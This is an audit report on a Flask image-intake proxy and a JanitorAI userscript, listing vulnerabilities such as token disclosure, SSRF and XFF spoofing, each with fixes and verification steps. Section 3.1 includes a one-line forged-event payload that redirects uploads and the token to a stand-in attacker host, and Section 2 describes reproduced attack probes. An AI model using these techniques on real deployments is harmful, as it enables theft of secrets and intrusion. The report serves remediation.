# JanitorAI Image Intake — Prioritized Audit Report

**Date:** 2026-09-21 · **Repo:** `~/Coding/Stuff made with AI/JanitorAI image intake` (0 commits, no remote)
**Artifacts audited:** `zen-cors-proxy.py` (1152 LOC), `janitorai-image-intake.user.js` (v1.7.0, 1124 lines), 7 test files, README, start scripts, `.gitignore`
**Method:** 5 independent audits (security & secrets · userscript security & privacy · code quality & dead weight · docs & publishing · test coverage) → one adversarial cross-validation phase with independent reproduction → this consolidated report.
**Verification techniques:** full code re-reads; isolated Flask `test_client()` probes (temp `IMAGE_DIR`); two local HTTP servers for SSRF/redirect; live tunnel GETs; ruff 0.16.3; all 3 test suites re-run.
**Confidence:** ~95% of findings independently reproduced. The handful of overstatements/false positives are listed in **§7 — do not chase those**.

---

> ## 🔴 ACTIVE EXPOSURE — verified again at report time, 2026-09-21 13:02 UTC
> | Request to `https://YOUR-TUNNEL.ngrok-free.dev` | Result |
> |---|---|
> | `GET /img/.upload-token` | **200**, `application/octet-stream`, **33 bytes = 32-hex + `\n`**, full token begins `XXXXXXX1…`, `Access-Control-Allow-Origin: *` |
> | `GET /healthz` | 200 — leaks upstream base URLs + version |
> | `GET /img/token` | **200 with the real token** (also reachable without XFF via the `::ffff:` bug) |
>
> The internet can already read the upload token. Remote token `58e111…` ≠ this workstation's local token `XXXXXXX2…`, so **the tunnel points at a different host (the VPS/box running the deployed copy)**.
> **Token rotation is still outstanding. This is an incident, not a paper finding.**

---

## 0. IMMEDIATE ACTIONS — next 2 hours (in this order)

1. **Rotate the exposed token on the tunneled host.** On the box the ngrok URL points to: delete `~/.upload-token` / `zen-images/.upload-token` and restart (or set `IMAGE_UPLOAD_TOKEN=<new uuid4>`) — rotation is safe, the userscript re-fetches on next bind. If that box cannot be found, **take the tunnel down** (`kill` the ngrok process / revoke the ngrok agent session).
2. **Patch C1 locally + deployed** (name allowlist in `img_get`, move the token file out of `IMAGE_DIR`) — snippet in §2.1.
3. **Patch C3** (omit `Access-Control-Allow-Origin` on `/img/*`) and **C4** (`OWNER_KEY_SHA256` gate) — snippets in §2.3–2.4.
4. **Verify:** repeat the three `curl`s from the box above; expect `404` for `/img/.upload-token`, and `/img/token` must no longer return a token to an unbound IP.
5. **Sync the deployed userscript** with the repo copy (§5.2): the live `/intake.user.js` has a *different `@namespace`* and **no `@updateURL`/`@downloadURL`**, so every phone that installed from it can never auto-update.

Then proceed down the priority index. Nothing else in this report is streaming a secret to the internet right now.

---

## 1. Master priority index

| # | ID | Severity | Finding | Where | Effort |
|---|---|---|---|---|---|
| **P0 — live exposure / incident** | | | | | |
| 1 | **C1** | 🔴 Critical | Unauthenticated file read via `/img/<name>` exposes `.upload-token` (+ any future file in `IMAGE_DIR`) | `zen-cors-proxy.py:1001-1019` | S |
| 2 | **C3** | 🔴 Critical | `ACAO:*` on `/img/token` + preflight echoes arbitrary headers → drive-by token theft | `:652-671` | XS |
| 3 | **C4** | 🔴 Critical | Any IP with *any* valid upstream key self-binds and receives the upload token | `:851-859, 1063, 1105` | S |
| 4 | LIVE | 🔴 Critical | Public tunnel serves token; remote copy ≠ local copy | live host | S |
| **P1 — security, pre-release** | | | | | |
| 5 | **C2** | 🔴 Critical | Unauthenticated blind SSRF: allow-all default, redirect escape, `host:port` allowlist bug | `:264-272, 323-358, 400-437, 498-516, 1022-1025` | M |
| 6 | **M3** | 🟠 Medium | No `MAX_CONTENT_LENGTH`; base64 decoded before 12 MiB cap; Pillow `MAX_IMAGE_PIXELS=89.5M` | `:620, 958, 1025` | S |
| 7 | **H1** | 🟠 High | XFF last-hop trust unsound off the ngrok ingress → spoof a bound IP | `:809-822, 865-875` | S |
| 8 | **M1** | 🟠 Medium | `::ffff:<public>` treated as private → token with no XFF | `:826` | XS |
| 9 | **M2** | 🟡 Low-Med | Token compared with `!=` (not timing-safe) | `:947` | XS |
| 10 | **M4** | 🟠 Medium | `/img/<name>.json` sidecar leaks original client filename/path | `:1001-1019, 923` | XS |
| 11 | L1–L3 | 🟡 Low | `/`+`/healthz` fingerprinting; XFF/X-Real-IP leaked upstream; 0644 log/session files | `:673-701, 620-633, 96-104` | S |
| **P2 — userscript, pre-release** | | | | | |
| 12 | **US-1** | 🟠 High | Page-forgeable `CustomEvent` rebinds bridge → file + real token POSTed to `evil.tld` | `userscript:579-627, 641-644, 17` | M |
| 13 | **US-3** | 🟠 Medium | Upload token pre-populated into page-readable DOM `input.value` at boot | `:836-870, 1105` | XS |
| 14 | **US-2** | 🟠 Med-High | GM fetch of arbitrary message URLs: cookies sent, no size cap, no content-type check, private-network reach | `:106-142, 17` | S |
| 15 | **US-4** | 🟠 Medium | Unanchored whole-localStorage regex scan can bind any `/v1` URL | `:629-639` | S |
| 16 | **US-5** | 🟠 Medium | `@connect *` is unnecessary once US-1/US-2/US-4 are fixed | `:17` | XS |
| 17 | US-6–8 | 🟡 Low | Markdown injection from bridge URL; bridge origin logged; `GM_info` without `@grant`; wildcard `@match` | `:558-560, 621, 1115, 13` | S |
| **P3 — publishing blockers** | | | | | |
| 18 | P3.1 | 🔴 Blocker | `@updateURL`/`@downloadURL`/`@homepageURL` point at a repo that returns 404; 0 commits, no remote | `userscript:3,8-11` | S |
| 19 | P3.2 | 🔴 Blocker | `USERSCRIPT_FILE` default is a path that does not exist on this box → local `/intake.user.js` 404; deployed copy diverges | `proxy:176-178` | XS |
| 20 | P3.3 | 🔴 Blocker | Missing `requirements.txt`; README has no first-run/install section (stranger cannot start the bridge) | repo root / `README.md` | S |
| 21 | P3.4 | 🟠 High | Tests hardcode `~/Documents/zen-cors-proxy.py` and `~/Documents/zen-*` — any clone fails immediately | `test_imgintake.py:8`, `test_bootstrap_unit.py:8`, shell tests | S |
| 22 | P3.5 | 🟠 High | README restart path `~/Documents/start-zen-proxy.sh` does not exist; start script hardcodes `$HOME/Documents` | `README.md:90`, `start-zen-proxy.sh:12,15` | S |
| 23 | P3.6 | 🟠 Medium | 12 README-vs-code mismatches (version 2.1 vs 2.2, undocumented env vars, wrong upload shape, stale header comment…) | `README.md` | M |
| **P4 — quality & tests** | | | | | |
| 24 | Q1 | 🟠 Medium | 6 error-handling defects: 400-instead-of-413, `str(e)` leaked to client, unlocked `_image_fail_times`, `MISS` sentinel, link stripped even when fetch failed | `proxy:404-417, 913-914, 961-991, 274-284, 246/352/356` | M |
| 25 | Q2 | 🟠 Medium | Dead code + 5 duplications (MIME table, session retry, persist block, attachment block, 4× JSON parse) | proxy/userscript/tests | M |
| 26 | T1 | 🟠 High | Test suite gives false confidence: `CACHE_OK` is a tautology; bootstrap test never checks token; render case 9 never asserts `X-Upload-Token`; `"!!!"` accepted as 0-byte upload | tests | M |
| 27 | H1 | 🟡 Low | Housekeeping: move 196 KB `zephyr_send_images.user.js` out, delete caches, stale v1.5.2 duplicate, `.gitignore` nits, version drift | repo | S |

Severity: 🔴 critical/high → stop the line · 🟠 medium → fix before public release · 🟡 low → hygiene. Effort: XS ≤ 15 min · S ≤ 2 h · M ≤ 1 day.

---

## 2. Security — bridge (`zen-cors-proxy.py`)

### 2.1 C1 · CRITICAL — Unauthenticated arbitrary file read in `/img/<name>` → `.upload-token` disclosure
**Evidence (local + live, reproduced twice):** `GET /img/.upload-token` → 200 + 32-hex token; `GET /img/%2eupload-token` → 200; `GET /img/1234-abcd.png.json` → sidecar metadata. `Path(name).name` (`:1004`) is a traversal guard, **not a filename filter** — it happily returns dotfiles. Upload auth (`:947`) is therefore bypassable: read token → upload files. `ACAO:*` makes it cross-origin readable too. Path traversal itself is correctly blocked (`..%2f`, `%252f`, `%2e%2e`, `....//`, backslash all 404) — the bug is the same-directory dotfile leak.

**Fix:**
```python
_SAFE_NAME_RE = re.compile(r"^\d{10}-[0-9a-f]{10}\.(png|jpe?g|webp|gif)$")

def img_get(name):
    if not _SAFE_NAME_RE.match(name):          # rejects .upload-token, *.json, everything odd
        return json_resp({"error": {"message": "Not found",
                                    "type": "invalid_request_error"}}, 404)
    ...
# and move the token OUT of the served directory:
#   tokfile = pathlib.Path.home() / ".config" / "zen-proxy" / "upload-token"
# (migrate/delete the old file; update start script + README paths)
```
**Verify:** `/img/.upload-token`, `/img/%2eupload-token`, `/img/<id>.png.json` → 404; `/img/<real-id>.png` → 200.

### 2.2 C2 · CRITICAL — Unauthenticated blind SSRF via image intake
**Evidence:** `POST /v1/chat/completions` **without `Authorization`** and body `![p](http://127.0.0.1:<port>/probe)` made the bridge GET that target *before* upstream rejected with 401. Root causes, all reproduced:
- `IMAGE_INTAKE_HOSTS` defaults to empty = **allow-all** (`:160-163, 270-271`);
- `allow_redirects=True` with the allowlist checked only on the initial URL (`:336`) → allowlist `127.0.0.1:9901` fetched `9902/pwned` via redirect;
- `_host_allowed` compares `host:port` against **bare** hostnames (`http://127.0.0.1:8443` vs `127.0.0.1` → `False`) — so any explicit port silently bypasses a configured allowlist.

**Fix (all four parts needed):**
```python
def _host_allowed(url):
    u = urlparse(url)
    if u.scheme not in ("http", "https") or not u.hostname: return False
    if not IMAGE_INTAKE_HOSTS: return False                 # default-deny, not allow-all
    host = u.hostname.lower()
    if not any(host == h or host.endswith("." + h) for h in IMAGE_INTAKE_HOSTS):
        return False
    for fam, _, _, _, sa in socket.getaddrinfo(host, None):
        a = ipaddress.ip_address(sa[0])
        if a.is_private or a.is_loopback or a.is_link_local or a.is_reserved:
            return False
    return True
# fetch with allow_redirects=False and re-check every Location hop (or same-host only)
# and gate the whole intake path on the owner key (see C4)
```
**Verify:** no-auth POST to a local probe server must not fire; redirect hop must not be fetched; `http://127.0.0.1:8443` against allowlist `127.0.0.1` must now match (or be denied by DNS/IP check).

### 2.3 C3 · CRITICAL — `ACAO:*` on `/img/token` makes the owner-bound token cross-origin readable
**Evidence:** `/img/token` returned 200 + token with `Access-Control-Allow-Origin: *`; preflight echoed arbitrary `Access-Control-Request-Headers` (e.g. `X-Evil, X-Attacker`). Any page the owner visits while on a bound network can `fetch()` the token — IP binding is irrelevant once the response is readable cross-origin.

**Fix:** in `cors_headers()` omit `Access-Control-Allow-Origin` for `/img/*` (scope `*` to `/v1/*`, which JanitorAI itself calls from the page).
**Caveat (from cross-validation):** only the plain-`fetch` fallback inside `gmFetch` breaks; the normal `GM_xmlhttpRequest` path (which userscripts use) is unaffected.
**Verify:** `/img/token` no longer carries ACAO; `/v1/models` still does.

### 2.4 C4 · CRITICAL — "Owner binding" accepts any successful upstream chat, including an attacker's own key
**Evidence:** attacker IP `198.51.100.66` + its own valid key + a mocked 200 upstream → `/img/token` returned the real token. `remember_auth_ip()` is called on `up.status_code < 400` (`:1063, 1105`) with **no check of whose key it was**; 401 correctly does not bind. The README claim "provably one of the owner's devices" overstates the guarantee.

**Fix:**
```python
OWNER_KEY_SHA256 = {h.strip().lower()
                    for h in os.environ.get("OWNER_KEY_SHA256", "").split(",") if h.strip()}

def remember_auth_ip():
    if OWNER_KEY_SHA256:
        tok = bearer_token(flask_req.headers.get("Authorization", ""))
        if hashlib.sha256(tok.encode()).hexdigest().lower() not in OWNER_KEY_SHA256:
            return
    ...
```
Document `OWNER_KEY_SHA256` in README/env table. **Verify:** `test_bootstrap_unit.py`'s mock-200 bind path must now fail for a non-owner key and pass for the owner hash.

### 2.5 H1 · HIGH — XFF "last entry" rule is only sound behind a single trusted edge
**Evidence:** direct request with `REMOTE_ADDR=198.51.100.9` + forged `X-Forwarded-For: <bound IP>` → **200 + token**; when the real IP is appended last → 403. `app.run(host="0.0.0.0")` plus a Tailscale address means LAN/tailnet/port-forward clients control XFF completely.
**Fix:** accept XFF only when `remote_addr` is in an explicit trusted-proxy set, or when the ngrok ingress shared-secret header matches (env-driven); otherwise use `remote_addr` verbatim. Document the deployment assumption.

### 2.6 M1 · MEDIUM — `::ffff:` mapping makes any public IPv4 look private
**Evidence:** `_is_private_ip("::ffff:8.8.8.8")` → `True` and `GET /img/token` with `REMOTE_ADDR=::ffff:8.8.8.8`, no XFF → **200 + token**. (`fd00::/8` ULA returns `False` — false negative.)
**Fix:** replace string checks with `ipaddress.ip_address(ip)`; unwrap `ipv4_mapped`; use `is_private/is_loopback/is_link_local`. **Verify:** `::ffff:8.8.8.8` → private `False`; both `/img/token` probes → 403.

### 2.7 M2 · LOW-MED — Token compared with `!=`
`zen-cors-proxy.py:947`; no `hmac.compare_digest` anywhere. One-line fix: `if IMAGE_UPLOAD_TOKEN and not hmac.compare_digest(tok, IMAGE_UPLOAD_TOKEN):`.

### 2.8 M3 · MEDIUM — No request-size limits / DoS surface
`app.config["MAX_CONTENT_LENGTH"] = None` (`:620`); full JSON body is buffered once (Werkzeug caches `get_data()` — not twice), then `base64.b64decode` of the whole payload happens **before** the 12 MiB check (`:958`); Pillow `MAX_IMAGE_PIXELS = 89,478,485` (warning, not error). A huge unauthenticated POST → memory/disk exhaustion; a compressed 12 MiB PNG → hundreds of MB RAM. Multipart path streams with a cap (good), but Werkzeug spools parts to `/tmp` unbounded.
**Fix:** `MAX_CONTENT_LENGTH = 16*1024*1024`; reject `len(b64) > MAX*4//3 + 1024` *before* decode; set an explicit `Image.MAX_IMAGE_PIXELS` and call `img.verify()` before resize; return **413** not 400 (§4, Q1).

### 2.9 M4 · MEDIUM — `/img/<name>.json` sidecar leaks the original client filename
**Evidence:** `GET /img/1234-abcd.png.json` → `{"orig": "~/Pictures/private-birthday-photo.png", ...}` — leaks username, directory structure and upload time. **Fix:** C1's regex rejects `.json`; additionally store only `Path(orig).name` in `meta["orig"]` (`:923`).

### 2.10 Low-severity secrets / hygiene
| Where | Finding | Fix |
|---|---|---|
| `:673-701` | `/` and `/healthz` publicly advertise upstream base URLs + proxy version | trim to `{"ok":true}`; drop version/upstreams |
| `:620, 630-633` | `X-Forwarded-For` and `X-Real-IP` are forwarded upstream (RFC 7239 `Forwarded` is **not** — correction) | add both to the hop-by-hop/redaction list |
| `:96-104` | `~/logs/zen-bridge.log` is 0644 (world-readable IPs/session slices); `~/.zen-proxy-default-session` 0644 | `os.umask(0o077)` / `chmod 0o600` |
| `test_imgintake.py:8`, `test_bootstrap_unit.py:8` | hardcoded `~` paths and **not gitignored** | parameterize relative to `__file__` / env |
| `zen-cors-proxy.py:895` | docstring says `(name, total)`, returns `(name, mime, total)` | fix comment |
| `start-zen-proxy.local.sh:2` | real tunnel hostname in working tree | gitignored, 0 commits → history clean. Rotate if the file ever leaves the machine. ngrok TLS-terminates → ngrok sees the upstream `Authorization`, prompts and images; document this. |

---

## 3. Userscript — `janitorai-image-intake.user.js`

### 3.1 US-1 · HIGH — Page-forgeable bridge binding → upload hijack + token exfiltration
The injected page-context sniffer dispatches a plain, unauthenticated `CustomEvent('ji-bridge-url')` (`:592`); the listener (`:641-644`) accepts any string and `learnBridgeFromUrl` (`:616-627`) overwrites `settings.bridgeBase`. Any page script (ads, analytics, XSS) can run:
```js
window.dispatchEvent(new CustomEvent('ji-bridge-url', {detail:{url:'https://evil.tld'}}))
```
and the next 📎 attach POSTs the file **and the real `X-Upload-Token`** (`:546-550`) to `evil.tld`, permitted by `@connect *`.
**Fix (best → acceptable):** (1) bridge challenge-response — request `/img/token?nonce=…` and require a proof the page attacker can't produce before binding; (2) **require user confirmation and pin** (`bridgePinned` flag) so a later event can't rebind; (3) drop the sniffer and learn only from the JanitorAI proxy setting, still with confirmation.

### 3.2 US-3 · MEDIUM — Upload token lives in page-readable DOM
`buildSheet()` runs at boot and line `:870` writes `settings.uploadToken` into `input[data-role="token"].value`. `type="password"` only masks rendering; `document.querySelector('.ji-sheet [data-role="token"]').value` reads it from page load onward.
**Fix:** populate only in `openSheet(true)`, clear in `openSheet(false)`; better, render the sheet in a closed shadow root; best, never echo the secret ("configured ✓").

### 3.3 US-2 · MEDIUM-HIGH — Privileged GM fetch of arbitrary message-supplied URLs
`loadPreviewViaGM` (`:106-142`) fetches every image URL in chat (including bot output and other users' messages) with `GM_xmlhttpRequest`: **cookies attached** (`anonymous:true` missing — Tampermonkey sends cookies by default), **no size cap** (arraybuffer + Blob buffers everything), **no `image/*` content-type check**, arbitrary/private hosts reachable, and the ngrok skip-warning header is sent to every host.
**Fix:** `anonymous:true`; `if (!/^image\//i.test(ct)) fail();`; cap `Content-Length` ~20 MB; send `ngrok-skip-browser-warning` only when `/ngrok/i.test(host)`; use plain `<img loading="lazy" referrerpolicy="no-referrer">` for non-bridge hosts; start fetches from an `IntersectionObserver`.

### 3.4 US-4 · MEDIUM — Over-broad localStorage scan
`scanLocalStorageForBridge` (`:629-639`) iterates **every** key with unanchored regex `/(v1|chat\/completions|hemmingway|zen)/`; any page-written value ending `/v1` is learned as the bridge and receives image bytes + `X-Upload-Token`.
**Fix:** restrict to JanitorAI's known proxy key(s); `https:` only + host allowlist/bridge challenge; user confirmation; pin after bind.

### 3.5 US-5 · MEDIUM — `@connect *`
Only needed because the bridge host is dynamic (`:17`) and US-2 routes arbitrary URLs through GM fetch. **Fix:** enumerate `ngrok-free.dev`, `ngrok-free.app`, `ngrok.app`, `trycloudflare.com`, `localhost`, `127.0.0.1`; document "add `@connect <your-host>` when changing tunnels"; then US-2's host allowlist makes the narrow list sufficient.

### 3.6 Low-severity
- **US-6** (`:558-560, 662`): bridge-supplied URL pasted into outgoing markdown unvalidated → use `new URL(url, base)`, require `http(s)` + same origin as bridge, percent-encode `)`/whitespace.
- **US-7** (`:621, :137`): bridge origin logged to console when verbose (page can wrap `console.log`) — don't log the host. Blob preview src is page-readable; acceptable for public images, consider revoke-after-decode.
- **US-8** (`:1115, :13`): `GM_info` used without `@grant GM_info`; wildcard subdomain `@match` (runtime hostname re-check at `:42` already exists).
- Header comment `:35-37` is stale (manual paste instructions vs the real auto-learn flow) — see §5.3.

**Verified clean (don't regress):** no XSS — the only `innerHTML` template interpolates a constant `CSS_PREFIX`; all dynamic values use `textContent`/`.value`. `href`/`src` constrained to `http(s)`; `rel="noopener noreferrer"` + `referrerPolicy=no-referrer`; text-node insertion; `@noframes`; token stored only in GM storage, never logged or put in `data-*`/toast/errors.

---

## 4. Code quality (`zen-cors-proxy.py`, scripts, userscript)

### 4.1 P0 — broken things
- **P0.1** userscript update URLs → 404 repo (see §5.1).
- **P0.2** `USERSCRIPT_FILE` default path missing → `/intake.user.js` 404 locally; live tunnel serves a divergent copy (see §5.2).
- **P0.3** README restart command/stale paths (`README.md:90`; `start-zen-proxy.sh:12,15`).
- **P0.4** = M1 above.

### 4.2 Dead code (delete)
`on_chunk` param (`proxy:895`) · stale return docstring (`:896` vs `:925`) · unused `n_images` (RUF059, `:1026`) · `PUBPATH` (`test_imghost.sh:25`) · duplicated header paragraph (`test_render_smoke.js:9-11`) · redundant `.gitignore:11` · dead second clause in `isImgUrl` (`userscript:76`).

### 4.3 Duplication (extract)
MIME table `:920-921` vs `_IMG_MIME_BY_EXT :996-998` · `MissingSessionID` retry `:1066` vs `:1101` · `img_upload` persist try/except `:965-971` vs `:985-992` · `_apply_attachments` fetch/append/log `:409-415` vs `:424-438` · body JSON parsed up to **4×** (`:502/:507`, `:582`, `:784`, `:1043`) — parse once in `proxy_passthrough` and pass down (after intake the body contains multi-MB data URLs, so this is real work) · cross-language image regexes `:233-240` vs userscript `:70-71` (add mutual pointer comments) · route **before** transform (`:1026-1027`) so unroutable paths don't trigger downloads.

### 4.4 Error handling (fix)
1. Broad `except Exception` around base64 (`:961`) → `binascii.Error`/`ValueError`.
2. Size cap returns 400; should be **413** (`:913-914` surfaced at `:967/:989`).
3. `str(e)` leaked to client (`:969, :991, :1139`) — log detail server-side, return generic.
4. `_image_fail_times` read/written **unlocked** (`:246, 279, 352, 356`) while Flask runs `threaded=True` — fold under `_image_cache_lock`.
5. `_cache_get` `"MISS"` string sentinel (`:274-284`) → module-level `_MISS = object()`.
6. Failed fetch still strips the markdown link even when nothing attached (`:404-417`), asymmetric with `:416-417` — strip only URLs that actually attached.
7. Justified defensive `BLE001` catches at `:105, :300, :318, :354` — leave, optionally `# noqa` with reason.

### 4.5 Style / tooling
- **Version drift:** `janitorai-bridge/2.1` (`:49, :675`) vs banner `v2.2` (`:1144`) + README v2.2 → centralize `VERSION = "2.2"` and derive all three (see also README mismatch #1).
- **ruff 0.16.3:** `I001` `:30`; `RUF059` `:1026`; `UP031` `:106, :962, :1148`; `BLE001` list (note: `:913` in the original list should read `:961`; count unchanged at 7). Tests: `test_imgintake.py` I001/UP031/RUF015; `test_bootstrap_unit.py` UP031. **Do not run `ruff format` blindly — it produces an 825-line diff.** No ruff/pytest config exists.
- Shell tests `0644` vs proxy `0755`; userscript section numbering `1,2,2b,2c,2d,3,4`.

### 4.6 Housekeeping
Move `zephyr_send_images.user.js` (third-party, GreasyFork #561922, MIT, v2.6.1, unreferenced, gitignored) out of the repo — re-downloadable, never reformat. Delete `__pycache__/` + `.ruff_cache/` (already done during validation). Delete/archive stale `~/Documents/helldivers cheaty mods/janitorai-image-intake.user.js` (v1.5.2 vs repo 1.7.0). Remove `.gitignore /tmp/` (harmless but meaningless here — it can match a root `tmp/` in general, so it's not technically "dead", just unused). Commit `package-lock.json` for `npm ci` reproducibility. `.gitignore` is missing `.venv/`, `venv/`, `.env`, `nohup.out`.

---

## 5. Publishing & docs readiness

### 5.1 Repo/metadata blocker (P3.1)
`@namespace`, `@homepageURL`, `@supportURL`, `@updateURL`, `@downloadURL` all reference `github.com/ARTHURMURILO/janitorai-go-and-image-intake-fixer`. **Live check: HTTP 404** (both repo and raw URL); repo has 0 commits and **no remote**. Tampermonkey auto-update silently fails forever, and raw installs fail.
**Do:** create the public repo on branch `main` (note: the account's other repos default to `master` — `/main/` must be deliberate), commit the userscript at the exact raw path, verify raw URL → 200, and bump `@version` on every release. Keep `@name`/`@namespace` stable. Alternatively strip the URLs until the host exists.

### 5.2 Deployed userscript divergence (P3.2 — new, found in validation)
The live tunnel's `/intake.user.js` returns **200, v1.7.0, 1120 lines** — but with `@namespace github.com/arthur/...` (lowercase, no scheme) and **no `@updateURL`/`@downloadURL`**, while the repo copy points at the 404 repo. Since `@namespace` is part of a script's identity, phones installed from the tunnel will **never auto-update**, and they are a *different script* to Tampermonkey.
**Do:** fix `USERSCRIPT_FILE` default to be script-relative — `pathlib.Path(__file__).with_name("janitorai-image-intake.user.js")` — redeploy the repo copy to the tunneled box, and document `GET /intake.user.js` in the README.

### 5.3 README vs code — 12 mismatches (P3.6)
| # | README says | Reality | Sev |
|---|---|---|---|
| 1 | Bridge v2.2 | code only prints 2.1 (`:49, :672`) | M |
| 2 | env table omits `IMAGE_INTAKE_CACHE` | exists, default 128 (`:164, :289`) | L |
| 3 | env table omits `USERSCRIPT_FILE` | `:176`; controls install URL | M |
| 4 | table titled "Bridge env knobs" lists only `IMAGE_*` | `PORT`, `LOG_LEVEL`, `UPSTREAM_URL`, `HEMMINGWAY_URL`, `PROXY_USER_AGENT`, `SESSION_FILE` undocumented — stranger cannot run it | **H** |
| 5 | "install janitorai-image-intake.user.js" | no install-URL flow documented; `/intake.user.js` never mentioned; default path broken | **H** |
| 6 | upload is "multipart `file` → `{url,path,id}`" | accepts multipart **and** JSON base64 (userscript uses JSON); response `{ok,path,url,id,size}` | M |
| 7 | binds on upstream "2xx" | binds on `<400` (3xx too) | L |
| 8 | restart `~/Documents/start-zen-proxy.sh` | path doesn't exist; script hardcodes `$HOME/Documents` | **H** |
| 9 | "set by start script to the ngrok URL" | placeholder `YOUR-TUNNEL...` if `.local.sh` absent → silent dead URLs | M |
| 10 | bridge store at `127.0.0.1:8081` | `PORT`/argv; 8081 is only the default | L |
| 11 | userscript header `:35-37` describes manual paste | actual flow auto-learns + auto-fetches token | M |
| 12 | tests section lists 3 of 7 files | missing `test_bootstrap.sh`, `test_bootstrap_unit.py`, `test_json_upload.sh`, `test_render_smoke.js` | L |

**Claims that check out** (don't re-audit): 4-image cap, newest-mention dedupe, reading order, system messages untouched, `/img/token` gate + 12 h TTL, `IMAGE_UPLOAD_TOKEN=off`, renderer path scope, drag&drop/caret insertion, safe-area CSS.

### 5.4 Missing files (P3.3)
- **`requirements.txt`** (release blocker for strangers): `flask>=3.0`, `requests>=2.31`, `Pillow>=10` (optional, import-guarded).
- README **first-run section**: clone → `pip install -r requirements.txt` → `./start-zen-proxy.sh` → tunnel → point JanitorAI base at `https://<host>/v1` → paste provider key. Only restart is documented today.
- **`CONTRIBUTING.md`**: how to run each test; never commit `*.local.sh`/tokens.
- **`CHANGELOG.md`** (optional, useful with `@version`).
- Keep the repo **flat**; move tests to `tests/` with `tests/fixtures/pixel.png`; commit `package-lock.json`.

### 5.5 Test runnability by a stranger (P3.4)
- Worst offender: `test_imgintake.py:8` and `test_bootstrap_unit.py:8` load `~/Documents/zen-cors-proxy.py`; works here only via an undocumented symlink. Fix with `ZEN_PROXY = os.environ.get("ZEN_PROXY", str(pathlib.Path(__file__).resolve().parent / "zen-cors-proxy.py"))`.
- Shell tests hardcode `127.0.0.1:8081`, `~/Documents/zen-images/.upload-token`, `~/Documents/zen-proxy.log` → parameterize with env defaults.
- `test_json_upload.sh:7` uses GNU-only `base64 -w0`; guard the missing-token failure message.
- Importing the module creates the token in the real user's home (`_load_or_create_upload_token()` at import) → tests must set a temp `IMAGE_DIR` before import.
- `test_live_intake.sh`/`test_bootstrap.sh` never assert/exit non-zero — useless for CI.
- Replace pinned `ella.janitorai.com` fixtures with a bundled `pixel.png`.
- No passwords/sshpass/LAN IPs found — good.

---

## 6. Test coverage & false confidence

### 6.1 Confirmed problems (T1)
1. **`test_imgintake.py` final `CACHE_OK` check is a no-op** — the monkeypatched fake fetcher is still installed (`:116`), and `CACHE_OK 39` equals the fake string exactly. **Correction:** the earlier "this test does a real network fetch at `:90`" claim is **false** — there is no live fetch and no network requirement; the test simply proves nothing at that step.
2. **`test_bootstrap_unit.py` asserts status only** (`:58-62`) — never checks the token body, the upload auth gate, or the disabled branch.
3. **`test_render_smoke.js` case 9 never asserts `X-Upload-Token`** — the GM stub is unconditional, so it passes even if token bootstrap returns `{}`.
4. `"!!!"` invalid base64 → **200 + 0-byte file** (real bug the tests should catch, `:960`).
5. Partial-fetch failure silently strips the failed link (real bug, `:404-415`).
6. `_image_fail_times` unbounded/unlocked (real bug).
7. Client `X-Opencode-Session` reaches Hemmingway despite the docstring (real bug).
8. `resolve_route` expects paths without a leading slash.

### 6.2 Highest-value missing tests (add in this order)
1. upload rejects invalid base64 → **400** (currently 200 + 0-byte file);
2. partial image-fetch failure **keeps the failed URL** in the prompt text;
3. `_encode_image` downscale/alpha/passthrough;
4. `resolve_route` + `pick_session_id` + `build_upstream_headers` matrix;
5. in-process upload → intake E2E via `127.0.0.1`;
6. `fetch_image_data_url` allowlist/caps/negative cache (pairs with C2);
7. upload store round-trip + error paths (413);
8. token lifecycle + disabled mode; `/img/token` trust matrix (pairs with C4/H1/M1);
9. streaming + `MissingSessionID` retry;
10. userscript: upload error taxonomy/payload, token retry, send guard, lightbox, localStorage learn, sniffer, regex contract.

### 6.3 Infrastructure
Portable module path + tmp `IMAGE_DIR`; pytest/CI + `npm ci` with committed lockfile; convert live shell scripts into diagnostics under `RUN_LIVE=1`.

---

## 7. Cross-validation corrections — do NOT chase these

| # | Claim from an earlier audit | Correction |
|---|---|---|
| 1 | Upstream `Forwarded` header leaks | XFF and `X-Real-IP` **are** forwarded; RFC 7239 `Forwarded` is **not**. Fix applies to 2 headers, not 3. |
| 2 | `test_imgintake.py` does a real network fetch / requires internet | **False** — the fake fetcher is still installed; the last step is a silent no-op (see §6.1.1). |
| 3 | `/intake.user.js` is dead in the live deployment | **False for the live tunnel** — remote returns 200 (v1.7.0). True for the repo-default/local deploy. Scope: "repo default/local", and add the metadata-divergence issue (§5.2). |
| 4 | "Userscript never injected into DOM" (security positive) | Overstated — contradicts verified US-3 (token in page-readable `input.value`). Never in markdown, but it **is** in the DOM. |
| 5 | Ruff `BLE001` list cites `:913` | Should be `:961`; count unchanged (7). |
| 6 | M3 "buffers whole body, twice" | Werkzeug caches `get_data()` — buffered **once**. Risk unchanged. |
| 7 | `.gitignore /tmp/` "can never match" | It can match a root `tmp/` dir in general; nothing exists today. Downgraded to optional cleanup. |

Verdict of the validator: ~95% of findings real; only the `/intake.user.js`-live-404 claim and the `test_imgintake.py` network claim are materially false, and the `Forwarded`/DOM-hygiene items are minor overstatements.

---

## 8. Suggested remediation roadmap

**Hour 0–2 (incident):** rotate token on the tunneled host · C1 · C3 · C4 · verify live endpoints 404/deny · sync deployed userscript.
**Day 1 (security hardening):** C2 · M3 · H1 · M1 · M2 · M4 · add regression tests 6.2(1)(2) & the C4 trust matrix · drop XFF/X-Real-IP upstream · fix log/session perms.
**Week 1 (publishable):** US-1 → US-3 → US-2 → US-4 → US-5 · create/push repo + verify raw URL 200 · fix `USERSCRIPT_FILE` · `requirements.txt` + first-run README · parameterize tests + bundle fixture · README refresh (mismatches 1–12) · fix `start-zen-proxy.sh` path assumption.
**Week 2+ (quality):** code P1 duplication/error handling · missing tests 6.2(3)–(10) · ruff I001/RUF059/UP031 · move zephyr, delete stale duplicate, `.gitignore`/lockfile cleanup.

### Verification checklist (run after fixes)
```bash
# live exposure gone
curl -s -o /dev/null -w '%{http_code}\n' https://<host>/img/.upload-token   # expect 404
curl -s https://<host>/img/token                                            # expect 403 for unbound IP
# token moved out of IMAGE_DIR and 0600
ls -l ~/.config/zen-proxy/upload-token 2>/dev/null; ls -l ~/Documents/zen-images/.upload-token 2>/dev/null || true
# security regression probes (local, temp IMAGE_DIR)
python3 test_imgintake.py && python3 test_bootstrap_unit.py && npm run test:render
bash test_imghost.sh   # with RUN_LIVE=1
ruff check zen-cors-proxy.py
# metadata after repo creation
curl -sI https://raw.githubusercontent.com/ARTHURMURILO/janitorai-go-and-image-intake-fixer/main/janitorai-image-intake.user.js | head -1
```

---

